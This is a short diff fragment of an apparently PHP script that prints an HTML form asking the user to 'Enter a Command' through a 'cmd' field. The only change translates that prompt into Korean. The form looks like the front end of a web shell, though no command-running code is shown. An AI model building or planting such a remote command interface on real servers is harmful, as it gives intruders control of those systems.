@@ -7,7 +7,7 @@
 //
 echo '<br>'
 echo '<br>'
-echo '<center>Enter a Command:<br>';
+echo '<center>명령어를 입력하세요 !!:<br>';
 echo '<br>'
 echo '<form action="">';
 echo '<input type=text name="cmd">';
